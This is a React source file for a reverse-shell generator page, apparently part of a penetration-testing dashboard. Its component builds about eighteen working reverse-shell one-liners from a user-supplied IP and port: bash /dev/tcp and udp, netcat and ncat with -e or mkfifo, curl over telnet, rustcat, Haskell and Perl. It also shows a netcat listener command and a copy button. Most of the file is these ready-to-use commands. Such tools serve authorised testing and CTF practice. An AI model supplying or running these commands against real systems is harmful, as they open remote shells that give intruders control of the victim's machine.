import React, { useState } from "react";
import { Wrapper } from "../../Dashboard/Profile/ProfileElements";
import { Input , Button,Title, Dropdown} from "./ReveseShellElement";
import { useEffect } from "react";


function ReverseShellGenerator() {
  const [useIp, setIp] = useState("10.10.10.10");
  const [port, setPort] = useState(9002);
  const [currentCommand,setCommand]=useState("sh -i >& /dev/tcp/"+useIp+"/"+port+" 0>&1")
  const [selected,setSelected]=useState("Bash -i")
  
 
  const reverseShellCommands = {
    "Bash -i": {
      "command": "sh -i >& /dev/tcp/"+useIp+"/"+port+" 0>&1",
      "meta": ["linux", "mac"]
    },
    "Bash 196": {
      "command": "0<&196;exec 196<>/dev/tcp/"+useIp+"/"+port+"; sh <&196 >&196 2>&196",
      "meta": ["linux", "mac"]
    },
    "Bash read line": {
      "command": "exec 5<>/dev/tcp/"+useIp+"/"+port+";cat <&5 | while read line; do $line 2>&5 >&5; done",
      "meta": ["linux", "mac"]
    },
    "Bash 5": {
      "command": "sh -i 5<> /dev/tcp/"+useIp+"/"+port+" 0<&5 1>&5 2>&5",
      "meta": ["linux", "mac"]
    },
    "Bash udp": {
      "command": "sh -i >& /dev/udp/"+useIp+"/"+port+" 0>&1",
      "meta": ["linux", "mac"]
    },
    "nc mkfifo": {
      "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc "+useIp+" "+port+" >/tmp/f",
      "meta": ["linux", "mac"]
    },
    "nc -e": {
      "command": "nc "+useIp+" "+port+" -e sh",
      "meta": ["linux", "mac"]
    },
    "nc.exe -e": {
      "command": "nc.exe "+useIp+" "+port+" -e sh",
      "meta": ["windows"]
    },
    "BusyBox nc -e": {
      "command": "busybox nc "+useIp+" "+port+" -e sh",
      "meta": ["linux"]
    },
    "nc -c": {
      "command": "nc -c sh "+useIp+" "+port+"",
      "meta": ["linux", "mac"]
    },
    "ncat -e": {
      "command": "ncat "+useIp+" "+port+" -e sh",
      "meta": ["linux", "mac"]
    },
    "ncat.exe -e": {
      "command": "ncat.exe "+useIp+" "+port+" -e sh",
      "meta": ["windows"]
    },
    "ncat udp": {
      "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u "+useIp+" "+port+" >/tmp/f",
      "meta": ["linux", "mac"]
    },
    "curl": {
      "command": "C='curl -Ns telnet://"+useIp+":"+port+"'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null",
      "meta": ["linux", "mac"]
    },
    "rustcat": {
      "command": "rcat connect -s sh "+useIp+" "+port+"",
      "meta": ["linux", "mac"]
    },
    "Haskell #1": {
      "command": "module Main where\n\nimport System.Process\n\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc "+useIp+" "+port+" >/tmp/f\"",
      "meta": ["linux", "mac"]
    },
    "Perl": {
      "command": "perl -e 'use Socket;$i=\""+useIp+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'",
      "meta": ["linux", "mac"]
    },
    "Perl no sh": {
      "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\""+useIp+":"+port+"\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
      "meta": ["linux", "mac"]
    },
    
  }
  const [Os,setOS]=useState(Object.keys(reverseShellCommands))

  

  function ChangeOnOS(){
    var currentOS= document.getElementById("OS-select").value
    if(currentOS == "all"){
      setOS(Object.keys(reverseShellCommands))
      
      
    }else{
      var filterOS =[]
       Object.keys(reverseShellCommands).map((keys)=>{
        
        reverseShellCommands[keys].meta.forEach((element)=>{
          if(element==currentOS){
            filterOS.push(keys)
          }
        })
       });setOS(filterOS)   }

       
    
       

        

  }
  

  
  function chainingPort() {
    
    setPort(document.getElementById("ports").value);

    if (document.getElementById("ports").value === "") {
      setPort(0);
    }
  }
  const [searchInput, setSearchInput] = useState("");

  // Function to handle changes in the search input
  const handleSearchChange = (event) => {
    setSearchInput(event.target.value);
  };

  // Filter reverse shell commands based on search input
  const filteredOs = Os.filter((key) =>
    key.toLowerCase().includes(searchInput.toLowerCase())
  );

  useEffect(()=>{setCommand(reverseShellCommands[selected].command)},[useIp,port])
  function ipChnage(){
    setIp(document.getElementById("IP").value)
    
  }
  function SetCurrent(key){
    var element= document.querySelectorAll(".Key")
    element.forEach((element)=>{
        if(element.id===key){
            element.style.backgroundColor="black"
        }else{
            element.style.backgroundColor=""
        }
    })
    setSelected(key)
        
    setCommand(reverseShellCommands[key].command) // Change 'selected' to 'key'
}
function copyToClipboard (text)  {
  if (navigator ?.clipboard ?.writeText) {
      navigator.clipboard.writeText(text)
      $('#clipboard-toast').toast('show')
  } else if (window ?.clipboardData ?.setData) {
      window.clipboardData.setData('Text', text);
      $('#clipboard-toast').toast('show')
  } else {
      $('#clipboard-failure-toast').toast('show')
  }
}

  

  return (
    <Wrapper>
      <Title>Reverse Shell Generator</Title>
      <div style={{ display: "flex", flexDirection: "row" }}>
        <div
          style={{
            display: "flex",
            flexDirection: "row",
            justifyContent: "center",
            backgroundColor: "#090909",
            marginRight: "3rem",
          }}
        >
          <label style={{ marginRight: "10px", color: "lightblack" }}>
            IP Address:
          </label>
          <Input
            id="IP"
            defaultValue={useIp}
            style={{ width: "50px" }}
            onChange={ipChnage}
          />
          <label style={{ marginRight: "10px", color: "lightblack" }}>
            Ports:
          </label>
          <Input id="ports" defaultValue="9902" onChange={chainingPort} />
        </div>

        <div
          style={{
            display: "flex",
            alignItems: "left",
            backgroundColor: "#090909",
          }}
        >
          <label style={{ marginRight: "10px", color: "lightblack" }}>
            Listener:
          </label>
          <label
            id="rv"
            style={{ marginRight: "10px", color: "lightblack" }}
          >
            nc -lvnp {port}
          </label>
          <Button
            onClick={() => {
              copyToClipboard(document.getElementById("rv").innerText);
            }}
          >
            Copy
          </Button>
        </div>
      </div>
      <div style={{display: "flex",
            flexDirection: "row",
            justifyContent: "center",
            alignItems: "center",
            backgroundColor: "#090909"}}>
      <div style={{marginRight:"10px"}}>
        <label>OS</label>
        <Dropdown id="OS-select" onChange={ChangeOnOS}>
          <option value="all">ALL</option>
          <option value="windows">Window</option>
          <option value="linux">Linux</option>
          <option value="mac">Mac</option>
        </Dropdown>
      </div>
      <div>
        <label>Search</label>
        <Input
          type="text"
          placeholder="Search..."
          value={searchInput}
          onChange={handleSearchChange}
        />
      </div></div>
      <div style={{ display: "flex", flexDirection: "row" }}>
        
      </div>
      <div style={{ display: "flex", flexDirection: "row" }}>
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            overflowY: "auto",
            backgroundColor: "#090909",
            height: "50rem",
            width: "20rem",
            marginTop: "3rem",
            borderRadius: "20px",
          }}
        >
          <div id="shell-display">
            {filteredOs.map((key) => (
              <div
                className="Key"
                id={key}
                onClick={() => {
                  SetCurrent(key);
                }}
                style={{ marginTop: "25px", marginLeft: "20px" }}
              >
                {key}
              </div>
            ))}
          </div>
        </div>
        <div
          style={{
            backgroundColor: "#090909",
            height: "50rem",
            width: "50rem",
            marginTop: "3rem",
            marginLeft: "1.5rem",
            borderRadius: "20px",
          }}
        >
          <div
            style={{
              backgroundColor: " #1a1a1a",
              marginRight: "20px",
              marginLeft: "20px",
              marginTop: "20px",
              borderRadius: "20px",
            }}
          >
            <h3 style={{ padding: "10px 10px 10px 10px" }}>{currentCommand}</h3>
          </div>
        </div>
      </div>
    </Wrapper>
    


  );
}

export default ReverseShellGenerator;
